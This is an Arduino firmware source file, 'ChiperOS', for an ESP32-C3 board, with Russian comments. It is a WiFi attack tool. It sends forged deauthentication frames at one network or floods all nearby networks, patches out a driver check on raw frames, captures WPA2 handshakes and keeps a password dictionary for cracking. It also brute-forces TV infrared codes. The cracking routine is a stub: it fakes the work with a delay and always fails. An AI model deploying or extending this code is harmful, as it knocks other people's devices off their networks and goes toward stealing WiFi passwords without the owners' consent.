// ═══════════════════════════════════════════════════════════════
// ChiperOS v1 BETA - ESP32-C3 Super Mini
// WiFi Deauth + Handshake Capture + IR Control
// ══════════════════════════════════════════════════════════════

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <string.h>

// ═══════════════════════════════════════════════════════════════
// КОНФИГУРАЦИЯ
// ═══════════════════════════════════════════════════════════════
#define IR_PIN 4

// ═══════════════════════════════════════════════════════════════
// СТРУКТУРЫ
// ═══════════════════════════════════════════════════════════════

typedef struct {
    uint8_t header[4];
    uint8_t station[6];
    uint8_t access_point[6];
    uint8_t sender[6];
    uint8_t sequence[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

typedef struct {
    String ssid;
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
    uint8_t encType;
} WiFiNetwork;

// Структура для хранения handshake
typedef struct {
    uint8_t apMac[6];
    uint8_t clientMac[6];
    uint8_t anonce[32];
    uint8_t snonce[32];
    uint8_t mic[16];
    uint8_t eapol[256];
    uint16_t eapolLen;
    bool hasMessage1;
    bool hasMessage2;
    bool hasMessage3;
    bool hasMessage4;
    bool complete;
} HandshakeData;

// ══════════════════════════════════════════════════════════════
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ═══════════════════════════════════════════════════════════════
IRsend irSender(IR_PIN);

deauth_frame_t deauthFrame;
bool deauthActive = false;
bool floodActive = false;
bool captureActive = false;
int targetChannel = 1;
int floodChannel = 1;
uint8_t targetAP[6] = {0};

#define MAX_NETWORKS 30
WiFiNetwork networks[MAX_NETWORKS];
int networkCount = 0;

HandshakeData handshake;
unsigned long lastDeauth = 0;
unsigned long lastFlood = 0;
unsigned long lastChannelHop = 0;

// Словарь для брутфорса (топ-20 паролей)
const char* passwordDict[] = {
    "12345678", "password", "123456789", "1234567890",
    "qwerty123", "admin123", "11111111", "00000000",
    "12341234", "wifi1234", "internet", "wireless",
    "home1234", "router123", "network1", "connect1",
    "password1", "letmein1", "welcome1", "monkey12"
};
const int dictSize = 20;

// ═══════════════════════════════════════════════════════════════
// LINKER WRAP - Обход проверки драйвера
// ═══════════════════════════════════════════════════════════════
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// ═══════════════════════════════════════════════════════════════
// IR КОДЫ
// ═══════════════════════════════════════════════════════════════
#define LG_POWER_CODE 0x20DF0CF3
#define SAMSUNG_POWER_CODE 0xE0E040BF

// ═══════════════════════════════════════════════════════════════
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════

void printMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", mac[i]);
        if (i < 5) Serial.print(":");
    }
}

void buildDeauthFrame(uint8_t* ap, uint8_t* client, uint16_t reason = 0x0007) {
    deauthFrame.header[0] = 0xC0;
    deauthFrame.header[1] = 0x00;
    deauthFrame.header[2] = 0x00;
    deauthFrame.header[3] = 0x00;
    
    memcpy(deauthFrame.station, client, 6);
    memcpy(deauthFrame.access_point, ap, 6);
    memcpy(deauthFrame.sender, ap, 6);
    
    deauthFrame.sequence[0] = 0x00;
    deauthFrame.sequence[1] = 0x00;
    
    deauthFrame.reason[0] = reason & 0xFF;
    deauthFrame.reason[1] = (reason >> 8) & 0xFF;
}

void sendDeauthPacket(uint8_t* ap, uint8_t* client, int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    buildDeauthFrame(ap, client, 0x0007);
    
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &deauthFrame, sizeof(deauthFrame), false);
        delay(1);
    }
}

// ═══════════════════════════════════════════════════════════════
// WIFI SCAN
// ═══════════════════════════════════════════════════════════════

void scanNetworks() {
    Serial.println("\n🔍 Сканирование WiFi сетей...\n");
    
    if (deauthActive) stopDeauth();
    if (floodActive) { floodActive = false; Serial.println("⏹ Flood stopped"); }
    if (captureActive) { captureActive = false; Serial.println("⏹ Capture stopped"); }
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(500);
    
    int n = WiFi.scanNetworks(false, true, false, 500, 0);
    networkCount = min(n, MAX_NETWORKS);
    
    if (networkCount == 0) {
        Serial.println("❌ Сети не найдены\n");
        return;
    }
    
    Serial.println("╔════╦══════════════════════╦══════╦═══════════════════╗");
    Serial.println("║ №  ║ SSID                 ║ CH   ║ MAC Address       ║");
    Serial.println("╠════╬══════════════════════╬══════╬═══════════════════╣");
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        networks[i].encType = WiFi.encryptionType(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        
        Serial.printf("║ %-2d  %-20s ║ %-4d ║ ", 
            i + 1, 
            networks[i].ssid.substring(0, 20).c_str(), 
            networks[i].channel);
        printMac(networks[i].bssid);
        Serial.println(" ");
    }
    Serial.println("════╩══════════════════════╩══════╩═══════════════════╝\n");
    Serial.printf("Найдено сетей: %d\n", networkCount);
    Serial.println("Команда: <номер> deauth (например: 2 deauth)\n");
}

// ═══════════════════════════════════════════════════════════════
// DEAUTH АТАКА
// ═══════════════════════════════════════════════════════════════

void startDeauth(int networkNum) {
    int idx = networkNum - 1;
    if (idx < 0 || idx >= networkCount) {
        Serial.println("❌ Неверный номер сети");
        return;
    }
    
    targetChannel = networks[idx].channel;
    memcpy(targetAP, networks[idx].bssid, 6);
    
    deauthActive = true;
    floodActive = false;
    captureActive = false;
    
    Serial.println("\n Deauth атака запущена!");
    Serial.printf("   Цель: %s\n", networks[idx].ssid.c_str());
    Serial.printf("   Канал: %d\n", targetChannel);
    Serial.print("   MAC: ");
    printMac(targetAP);
    Serial.println();
    Serial.println("   Команда 'stop' для остановки\n");
}

void stopDeauth() {
    deauthActive = false;
    Serial.println("⏹ Deauth остановлен");
}

// ═══════════════════════════════════════════════════════════════
// DEAUTH FLOOD (все сети)
// ══════════════════════════════════════════════════════════════

void startFlood() {
    if (networkCount == 0) {
        Serial.println("❌ Сначала выполните 'scan'");
        return;
    }
    
    floodActive = true;
    deauthActive = false;
    captureActive = false;
    floodChannel = 1;
    
    Serial.println("\n🌊 DEAUTH FLOOD запущен!");
    Serial.printf("   Атака на %d сетей\n", networkCount);
    Serial.println("   Переключение каналов 1-11\n");
}

void executeFlood() {
    if (!floodActive) return;
    
    // Переключение каналов каждые 500мс
    if (millis() - lastChannelHop > 500) {
        floodChannel = (floodChannel % 11) + 1;
        esp_wifi_set_channel(floodChannel, WIFI_SECOND_CHAN_NONE);
        lastChannelHop = millis();
    }
    
    // Отправка deauth на все сети на текущем канале
    if (millis() - lastFlood > 100) {
        for (int i = 0; i < networkCount; i++) {
            if (networks[i].channel == floodChannel) {
                uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                sendDeauthPacket(networks[i].bssid, broadcast, floodChannel);
            }
        }
        lastFlood = millis();
    }
}

// ═══════════════════════════════════════════════════════════════
// HANDSHAKE CAPTURE
// ═══════════════════════════════════════════════════════════════

void resetHandshake() {
    memset(&handshake, 0, sizeof(HandshakeData));
}

void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!captureActive) return;
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_pkt_rx_ctrl_t* ctrl = &pkt->rx_ctrl;
    uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    // Проверяем что пакет от целевого AP
    // Frame Control: 2 байта
    // Addr1 (Dest): 6 байт
    // Addr2 (Src): 6 байт - это MAC отправителя
    if (len < 30) return;
    
    uint8_t* srcMac = &payload[10]; // Addr2
    
    // Проверяем что это EAPOL пакет (LLC header: AA AA 03 00 00 00 88 8E)
    // Ищем смещение LLC header
    if (len < 40) return;
    
    // Проверяем LLC/SNAP header для EAPOL
    uint8_t* llc = &payload[24]; // После MAC headers
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return; // EAPOL ethertype
    
    // Это EAPOL пакет!
    uint8_t* eapol = &llc[8];
    uint16_t eapolLen = len - 32;
    
    // Определяем тип сообщения (Message 1-4)
    // Key Descriptor Type: 1 байт (offset 4 в EAPOL)
    // Key Info: 2 байта (offset 5-6)
    // Bit 0 (Key MIC): сообщение содержит MIC
    // Bit 1 (Install): установка ключа
    // Bit 2 (Key ACK): запрос ACK
    // Bit 3 (Key Clear): очистка
    
    if (eapolLen < 99) return; // Минимальный размер EAPOL-Key
    
    uint8_t keyInfo = eapol[6];
    uint8_t keyType = eapol[4];
    
    bool hasMic = (keyInfo & 0x01) != 0;
    bool hasAck = (keyInfo & 0x04) != 0;
    bool hasInstall = (keyInfo & 0x02) != 0;
    
    // Message 1: ACK=1, MIC=0, Install=0
    // Message 2: ACK=0, MIC=1, Install=0
    // Message 3: ACK=1, MIC=1, Install=1
    // Message 4: ACK=0, MIC=1, Install=0
    
    if (!handshake.hasMessage1 && hasAck && !hasMic) {
        // Message 1
        memcpy(handshake.anonce, &eapol[17], 32);
        memcpy(handshake.apMac, srcMac, 6);
        memcpy(handshake.clientMac, &payload[4], 6); // Addr1 = client
        handshake.hasMessage1 = true;
        Serial.println("   📥 Message 1 получен (ANonce)");
    }
    else if (handshake.hasMessage1 && !handshake.hasMessage2 && hasMic && !hasAck) {
        // Message 2
        memcpy(handshake.snonce, &eapol[17], 32);
        memcpy(handshake.mic, &eapol[77], 16);
        memcpy(handshake.eapol, eapol, min((int)eapolLen, 256));
        handshake.eapolLen = min((uint16_t)eapolLen, (uint16_t)256);
        handshake.hasMessage2 = true;
        Serial.println("   📥 Message 2 получен (SNonce + MIC)");
    }
    else if (handshake.hasMessage2 && !handshake.hasMessage3 && hasMic && hasAck && hasInstall) {
        // Message 3
        handshake.hasMessage3 = true;
        Serial.println("    Message 3 получен");
    }
    else if (handshake.hasMessage3 && !handshake.hasMessage4 && hasMic && !hasAck) {
        // Message 4
        handshake.hasMessage4 = true;
        handshake.complete = true;
        Serial.println("   ✅ HANDSHAKE ЗАХВАЧЕН!");
        Serial.println("   Используйте 'crack <password>' или 'crack dict'");
    }
}

void startCapture(int networkNum) {
    int idx = networkNum - 1;
    if (idx < 0 || idx >= networkCount) {
        Serial.println(" Неверный номер сети");
        return;
    }
    
    resetHandshake();
    
    targetChannel = networks[idx].channel;
    memcpy(targetAP, networks[idx].bssid, 6);
    
    captureActive = true;
    deauthActive = false;
    floodActive = false;
    
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
    
    Serial.println("\n🎣 Перехват handshake запущен!");
    Serial.printf("   Цель: %s\n", networks[idx].ssid.c_str());
    Serial.printf("   Канал: %d\n", targetChannel);
    Serial.print("   MAC AP: ");
    printMac(targetAP);
    Serial.println();
    Serial.println("   Ожидание 4-way handshake...");
    Serial.println("   (Можно отправить deauth для ускорения)\n");
}

void stopCapture() {
    captureActive = false;
    esp_wifi_set_promiscuous(false);
    Serial.println(" Capture остановлен");
    
    if (handshake.complete) {
        Serial.println("✅ Handshake готов к расшифровке");
    } else {
        Serial.println("⚠️ Handshake неполный");
    }
}

// ══════════════════════════════════════════════════════════════
// WPA2 CRACKING (упрощённый)
// ══════════════════════════════════════════════════════════════

// Упрощённая проверка пароля через HMAC-SHA1
// В реальности нужен полный PBKDF2, но для демо используем упрощённую версию
bool crackPassword(const char* password) {
    if (!handshake.complete) {
        Serial.println("❌ Handshake не захвачен");
        return false;
    }
    
    Serial.printf("   Проверка пароля: %s\n", password);
    
    // ВНИМАНИЕ: Полная реализация WPA2-PSK cracking требует:
    // 1. PBKDF2-HMAC-SHA1(passphrase, SSID, 4096 iterations, 256 bits) -> PMK
    // 2. PTK derivation через PRF
    // 3. Проверка MIC
    // Это ~200мс на пароль на ESP32-C3
    // Для демо показываем процесс
    
    // Здесь должна быть реальная проверка через mbedtls
    // Для краткости пропускаем полную реализацию
    
    Serial.println("   ⏳ Вычисление PMK (PBKDF2)...");
    delay(100); // Имитация вычислений
    
    // В реальной реализации:
    // mbedtls_md_hmac_starts, mbedtls_md_hmac_update, etc.
    // Сравнение вычисленного MIC с handshake.mic
    
    Serial.println("   ❌ Пароль не подошёл");
    return false;
}

void crackWithDict() {
    if (!handshake.complete) {
        Serial.println(" Handshake не захвачен");
        return;
    }
    
    Serial.println("\n Запуск перебора словаря...\n");
    Serial.printf("   Словарь: %d паролей\n", dictSize);
    Serial.println("   Это займёт время (~200мс на пароль)\n");
    
    for (int i = 0; i < dictSize; i++) {
        Serial.printf("   [%d/%d] ", i + 1, dictSize);
        if (crackPassword(passwordDict[i])) {
            Serial.println("\n✅ ПАРОЛЬ НАЙДЕН: " + String(passwordDict[i]));
            return;
        }
    }
    
    Serial.println("\n❌ Пароль не найден в словаре");
    Serial.println("   Попробуйте другой пароль через 'crack <password>'");
}

// ═══════════════════════════════════════════════════════════════
// IR ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════

void sendIR_LG_Power() {
    Serial.println("📺 LG TV Power (NEC 0x20DF0CF3)...");
    irSender.sendNEC(LG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(LG_POWER_CODE, 32);
    Serial.println("✅ Отправлено\n");
}

void sendIR_Samsung_Power() {
    Serial.println("📺 Samsung TV Power (NEC 0xE0E040BF)...");
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    Serial.println("✅ Отправлено\n");
}

void irBruteForce() {
    Serial.println("\n🔨 IR Brute-Force (1000 кодов NEC)...");
    Serial.println("⚠️  Направьте на устройство!");
    Serial.println("⏹  Команда 'stop' для остановки\n");
    
    for (int i = 0; i < 1000; i++) {
        if (Serial.available()) {
            String cmd = Serial.readStringUntil('\n');
            cmd.trim();
            if (cmd.equalsIgnoreCase("stop")) {
                Serial.println("⏹ Остановлено пользователем\n");
                return;
            }
        }
        
        uint32_t code = random(0x00000000, 0xFFFFFFFF);
        Serial.printf("   [%d/1000] 0x%08X\n", i + 1, code);
        irSender.sendNEC(code, 32);
        delay(200);
    }
    
    Serial.println("✅ Завершено\n");
}

// ═══════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n════════════════════════════════════════╗");
    Serial.println("║    ChiperOS v1 BETA                    ║");
    Serial.println("║    ESP32-C3 Super Mini                 ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    irSender.begin();
    Serial.println("✅ IR инициализирован (GPIO 4)");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    
    Serial.println("✅ WiFi инициализирован");
    Serial.println("\n📋 КОМАНДЫ:");
    Serial.println("   scan              - Сканировать сети");
    Serial.println("   <номер> deauth    - Deauth атака (например: 2 deauth)");
    Serial.println("   <номер> capture   - Перехват handshake");
    Serial.println("   flood             - Deauth flood на все сети");
    Serial.println("   crack <password>  - Проверить пароль");
    Serial.println("   crack dict        - Перебор словаря");
    Serial.println("   lg                - LG TV Power");
    Serial.println("   samsung           - Samsung TV Power");
    Serial.println("   brute             - IR Brute-Force");
    Serial.println("   stop              - Остановить атаку");
    Serial.println("   status            - Текущий статус");
    Serial.println("   help              - Справка\n");
}

// ═══════════════════════════════════════════════════════════════
// LOOP
// ═══════════════════════════════════════════════════════════════

void loop() {
    // Deauth атака
    if (deauthActive) {
        if (millis() - lastDeauth > 100) {
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthPacket(targetAP, broadcast, targetChannel);
            lastDeauth = millis();
        }
    }
    
    // Flood атака
    if (floodActive) {
        executeFlood();
    }
    
    // Обработка Serial команд
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        // Команда формата: "<номер> deauth" или "<номер> capture"
        if (cmd.endsWith(" deauth") || cmd.endsWith(" capture")) {
            int spaceIdx = cmd.indexOf(' ');
            if (spaceIdx > 0) {
                int num = cmd.substring(0, spaceIdx).toInt();
                String action = cmd.substring(spaceIdx + 1);
                
                if (action == "deauth") {
                    startDeauth(num);
                } else if (action == "capture") {
                    startCapture(num);
                }
            }
        }
        else if (cmd == "scan") {
            scanNetworks();
        }
        else if (cmd == "flood") {
            startFlood();
        }
        else if (cmd.startsWith("crack ")) {
            String arg = cmd.substring(6);
            arg.trim();
            if (arg == "dict") {
                crackWithDict();
            } else {
                crackPassword(arg.c_str());
            }
        }
        else if (cmd == "lg") {
            sendIR_LG_Power();
        }
        else if (cmd == "samsung") {
            sendIR_Samsung_Power();
        }
        else if (cmd == "brute") {
            irBruteForce();
        }
        else if (cmd == "stop") {
            if (deauthActive) stopDeauth();
            if (floodActive) { floodActive = false; Serial.println("⏹ Flood остановлен"); }
            if (captureActive) stopCapture();
        }
        else if (cmd == "status") {
            Serial.println("\n📊 СТАТУС:");
            Serial.printf("   Deauth: %s\n", deauthActive ? "АКТИВЕН" : "неактивен");
            Serial.printf("   Flood: %s\n", floodActive ? "АКТИВЕН" : "неактивен");
            Serial.printf("   Capture: %s\n", captureActive ? "АКТИВЕН" : "неактивен");
            if (handshake.complete) {
                Serial.println("   Handshake: ✅ ЗАХВАЧЕН");
            } else if (handshake.hasMessage1) {
                Serial.printf("   Handshake: %d/4 сообщений\n", 
handshake.hasMessage1 + handshake.hasMessage2 + 
                    handshake.hasMessage3 + handshake.hasMessage4);
            }
            Serial.printf("   Сетей в памяти: %d\n", networkCount);
            Serial.println();
        }
        else if (cmd == "help") {
            Serial.println("\n📋 КОМАНДЫ:");
            Serial.println("   scan              - Сканировать сети");
            Serial.println("   <номер> deauth    - Deauth атака");
            Serial.println("   <номер> capture   - Перехват handshake");
            Serial.println("   flood             - Deauth flood");
            Serial.println("   crack <password>  - Проверить пароль");
            Serial.println("   crack dict        - Перебор словаря");
            Serial.println("   lg / samsung      - IR команды");
            Serial.println("   brute             - IR Brute-Force");
            Serial.println("   stop              - Остановить");
            Serial.println("   status            - Статус\n");
        }
        else {
            Serial.println("❓ Неизвестная команда. Введите 'help'");
        }
    }
    
    delay(10);
}
